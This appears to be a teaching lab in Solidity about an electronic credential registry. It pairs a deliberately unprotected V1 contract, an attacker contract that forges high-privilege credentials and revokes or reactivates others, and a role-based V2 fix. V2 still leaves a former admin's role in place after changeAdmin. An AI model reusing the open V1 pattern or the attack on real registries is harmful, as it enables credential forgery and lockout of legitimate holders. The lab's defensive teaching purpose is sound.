// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ELECTRONIC CREDENTIALS – SMART CONTRACT LAB
 *
 *  This file contains:
 *
 *   1) ElectronicCredentialsV1
 *        – vulnerable e-credential registry
 *
 *   2) ElectronicCredentialsAttacker
 *        – attacker that issues fake credentials and revokes others
 *
 *   3) ElectronicCredentialsV2Defense
 *        – secure, role-based credential issuance, revocation & verification
 *
 *  Model:
 *    - "Credential" = electronic credential bound to a subject (wallet or ID).
 *    - Contains: subject, issuer, type, metadata hash, expiry, status.
 *
 *  V1 BUGS:
 *    - Anyone can:
 *        * issue credentials (impersonate issuer)
 *        * change subject and type
 *        * revoke or reinstate any credential
 *    - No issuer role separation
 *
 *  V2 FIXES:
 *    - Roles: ADMIN, ISSUER, AUDITOR, VERIFIER
 *    - Only ISSUER/ADMIN can issue
 *    - Only ISSUER of that credential (or ADMIN) can revoke
 *    - Immutable issuance event
 *    - Strong status model: ACTIVE / REVOKED / EXPIRED
 *    - Helper view to verify credential validity
 */


/* ============================================================= */
/*          1. VULNERABLE ELECTRONIC CREDENTIALS (V1)            */
/* ============================================================= */

contract ElectronicCredentialsV1 {
    enum CredentialStatus {
        NONE,
        ACTIVE,
        REVOKED
    }

    struct Credential {
        address subject;          // owner / holder of credential
        address issuer;           // claimed issuer (not enforced)
        string credentialType;    // e.g. "KYC_BASIC", "EMPLOYEE", "STUDENT"
        string metadataURI;       // off-chain JSON / IPFS pointer
        uint64 issuedAt;
        uint64 expiresAt;         // 0 = no expiry
        CredentialStatus status;
        bool exists;
    }

    uint256 public credentialCounter;
    mapping(uint256 => Credential) public credentials;

    event CredentialIssued(
        uint256 indexed credentialId,
        address indexed subject,
        address indexed issuer,
        string credentialType
    );

    event CredentialUpdated(
        uint256 indexed credentialId,
        address subject,
        address issuer,
        string credentialType,
        string metadataURI
    );

    event CredentialStatusChanged(
        uint256 indexed credentialId,
        CredentialStatus newStatus
    );

    /*
     * ⚠️ V1 – NO ACCESS CONTROL
     *   - ANY address can:
     *       issueCredential, updateCredential, changeStatus
     *   - Attacker can:
     *       issue fake "KYC_LEVEL_3" credentials for themselves,
     *       revoke others, or reactivate invalid credentials.
     */

    function issueCredential(
        address subject,
        address issuer,
        string memory credentialType,
        string memory metadataURI,
        uint64 expiresAt
    ) external returns (uint256) {
        require(subject != address(0), "subject zero");
        require(issuer != address(0), "issuer zero");
        require(bytes(credentialType).length > 0, "type required");

        credentialCounter++;
        uint256 id = credentialCounter;

        credentials[id] = Credential({
            subject: subject,
            issuer: issuer,
            credentialType: credentialType,
            metadataURI: metadataURI,
            issuedAt: uint64(block.timestamp),
            expiresAt: expiresAt,
            status: CredentialStatus.ACTIVE,
            exists: true
        });

        emit CredentialIssued(id, subject, issuer, credentialType);
        return id;
    }

    // ⚠️ Anyone can change core fields
    function updateCredential(
        uint256 credentialId,
        address newSubject,
        address newIssuer,
        string memory newType,
        string memory newMetadataURI
    ) external {
        Credential storage c = credentials[credentialId];
        require(c.exists, "no credential");

        c.subject = newSubject;
        c.issuer = newIssuer;
        c.credentialType = newType;
        c.metadataURI = newMetadataURI;

        emit CredentialUpdated(
            credentialId,
            newSubject,
            newIssuer,
            newType,
            newMetadataURI
        );
    }

    // ⚠️ Anyone can flip ANY credential between ACTIVE/REVOKED
    function changeStatus(uint256 credentialId, CredentialStatus newStatus) external {
        Credential storage c = credentials[credentialId];
        require(c.exists, "no credential");
        require(newStatus != CredentialStatus.NONE, "invalid status");

        c.status = newStatus;
        emit CredentialStatusChanged(credentialId, newStatus);
    }

    function getCredential(uint256 credentialId)
        external
        view
        returns (
            address subject,
            address issuer,
            string memory credentialType,
            string memory metadataURI,
            uint64 issuedAt,
            uint64 expiresAt,
            CredentialStatus status,
            bool exists
        )
    {
        Credential storage c = credentials[credentialId];
        return (
            c.subject,
            c.issuer,
            c.credentialType,
            c.metadataURI,
            c.issuedAt,
            c.expiresAt,
            c.status,
            c.exists
        );
    }
}


/* ============================================================= */
/*        2. ATTACKER – ISSUE FAKE / REVOKE REAL CREDENTIALS     */
/* ============================================================= */

contract ElectronicCredentialsAttacker {
    ElectronicCredentialsV1 public target;
    address public attacker;

    event FakeCredentialIssued(uint256 indexed credentialId);
    event StatusForced(uint256 indexed credentialId, ElectronicCredentialsV1.CredentialStatus status);

    constructor(address _target) {
        target = ElectronicCredentialsV1(_target);
        attacker = msg.sender;
    }

    /*
     * Attack:
     *   - Issue fake high-privilege credential for attacker
     *   - Force revoke or reactivate credentials of legit users
     */

    function issueFakeHighPrivilege(string calldata metadataURI)
        external
        returns (uint256)
    {
        require(msg.sender == attacker, "not attacker");

        uint256 id = target.issueCredential(
            attacker,          // subject
            attacker,          // issuer (fake)
            "KYC_LEVEL_999",   // unrealistic high trust
            metadataURI,
            0                  // no expiry
        );

        emit FakeCredentialIssued(id);
        return id;
    }

    function forceStatus(
        uint256 credentialId,
        ElectronicCredentialsV1.CredentialStatus newStatus
    ) external {
        require(msg.sender == attacker, "not attacker");
        target.changeStatus(credentialId, newStatus);
        emit StatusForced(credentialId, newStatus);
    }
}


/* ============================================================= */
/*      3. SECURE ELECTRONIC CREDENTIALS – V2 DEFENSE            */
/* ============================================================= */

contract ElectronicCredentialsV2Defense {
    enum Role {
        NONE,
        VERIFIER,
        ISSUER,
        AUDITOR,
        ADMIN
    }

    enum CredentialStatus {
        NONE,
        ACTIVE,
        REVOKED,
        EXPIRED
    }

    struct Credential {
        address subject;
        address issuer;
        string credentialType;
        string metadataURI;       // IPFS/URL; off-chain attributes
        uint64 issuedAt;
        uint64 expiresAt;         // 0 = no expiry
        CredentialStatus status;
        bool exists;
    }

    address public systemAdmin;
    uint256 public credentialCounter;

    mapping(address => Role) public roles;
    mapping(uint256 => Credential) public credentials;
    mapping(address => uint256[]) public subjectCredentials; // subject => credentialIds

    event RoleAssigned(address indexed account, Role role);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);

    event CredentialIssued(
        uint256 indexed credentialId,
        address indexed subject,
        address indexed issuer,
        string credentialType,
        uint64 issuedAt,
        uint64 expiresAt
    );

    event CredentialRevoked(
        uint256 indexed credentialId,
        address revokedBy,
        string reason
    );

    event CredentialExpired(
        uint256 indexed credentialId
    );

    modifier onlyAdmin() {
        require(roles[msg.sender] == Role.ADMIN, "not admin");
        _;
    }

    modifier onlyIssuerOrAdmin() {
        Role r = roles[msg.sender];
        require(r == Role.ISSUER || r == Role.ADMIN, "not issuer/admin");
        _;
    }

    modifier onlyAuditorOrAdmin() {
        Role r = roles[msg.sender];
        require(r == Role.AUDITOR || r == Role.ADMIN, "not auditor/admin");
        _;
    }

    constructor() {
        systemAdmin = msg.sender;
        roles[msg.sender] = Role.ADMIN;
        emit RoleAssigned(msg.sender, Role.ADMIN);
    }

    // ---------------- ROLE MANAGEMENT ----------------

    function assignRole(address account, Role role) external onlyAdmin {
        require(account != address(0), "zero");
        require(role != Role.NONE, "invalid role");
        roles[account] = role;
        emit RoleAssigned(account, role);
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "zero");
        address old = systemAdmin;
        systemAdmin = newAdmin;
        roles[newAdmin] = Role.ADMIN;
        emit AdminChanged(old, newAdmin);
    }

    // ---------------- CREDENTIAL ISSUANCE ----------------

    function issueCredential(
        address subject,
        string memory credentialType,
        string memory metadataURI,
        uint64 expiresAt
    ) external onlyIssuerOrAdmin returns (uint256) {
        require(subject != address(0), "subject zero");
        require(bytes(credentialType).length > 0, "type required");

        credentialCounter++;
        uint256 id = credentialCounter;

        credentials[id] = Credential({
            subject: subject,
            issuer: msg.sender,
            credentialType: credentialType,
            metadataURI: metadataURI,
            issuedAt: uint64(block.timestamp),
            expiresAt: expiresAt,
            status: CredentialStatus.ACTIVE,
            exists: true
        });

        subjectCredentials[subject].push(id);

        emit CredentialIssued(
            id,
            subject,
            msg.sender,
            credentialType,
            uint64(block.timestamp),
            expiresAt
        );

        return id;
    }

    /*
     * Revoke credential:
     *   - Only original ISSUER or ADMIN can revoke
     *   - Cannot revert back to ACTIVE
     */
    function revokeCredential(uint256 credentialId, string memory reason) external {
        Credential storage c = credentials[credentialId];
        require(c.exists, "no credential");
        require(
            msg.sender == c.issuer || roles[msg.sender] == Role.ADMIN,
            "not issuer/admin"
        );
        require(c.status == CredentialStatus.ACTIVE, "not active");

        c.status = CredentialStatus.REVOKED;

        emit CredentialRevoked(credentialId, msg.sender, reason);
    }

    /*
     * Mark as expired (housekeeping):
     *   - Anyone can call, but it’s just a state sync when past expiry time.
     */
    function markExpired(uint256 credentialId) external {
        Credential storage c = credentials[credentialId];
        require(c.exists, "no credential");
        require(c.status == CredentialStatus.ACTIVE, "not active");
        require(c.expiresAt != 0 && block.timestamp >= c.expiresAt, "not expired");

        c.status = CredentialStatus.EXPIRED;
        emit CredentialExpired(credentialId);
    }

    // ---------------- VERIFICATION HELPERS ----------------

    /*
     * Check if a credential is currently valid:
     *   - exists
     *   - status == ACTIVE
     *   - not past expiresAt (if not 0)
     */
    function isCredentialValid(uint256 credentialId) public view returns (bool) {
        Credential storage c = credentials[credentialId];
        if (!c.exists) return false;
        if (c.status != CredentialStatus.ACTIVE) return false;
        if (c.expiresAt != 0 && block.timestamp >= c.expiresAt) return false;
        return true;
    }

    /*
     * Off-chain verifiers can call:
     *   - returns minimal info needed for policy evaluation
     */
    function getCredential(uint256 credentialId)
        external
        view
        returns (
            address subject,
            address issuer,
            string memory credentialType,
            string memory metadataURI,
            uint64 issuedAt,
            uint64 expiresAt,
            CredentialStatus status,
            bool valid
        )
    {
        Credential storage c = credentials[credentialId];
        subject = c.subject;
        issuer = c.issuer;
        credentialType = c.credentialType;
        metadataURI = c.metadataURI;
        issuedAt = c.issuedAt;
        expiresAt = c.expiresAt;
        status = c.status;
        valid = isCredentialValid(credentialId);
    }

    /*
     * List all credential IDs for a given subject.
     * Off-chain code can then call getCredential() per ID.
     */
    function getSubjectCredentials(address subject)
        external
        view
        returns (uint256[] memory)
    {
        return subjectCredentials[subject];
    }

    // ---------------- AUDIT VIEWS ----------------

    function getCredentialRaw(uint256 credentialId)
        external
        view
        onlyAuditorOrAdmin
        returns (Credential memory)
    {
        return credentials[credentialId];
    }
}
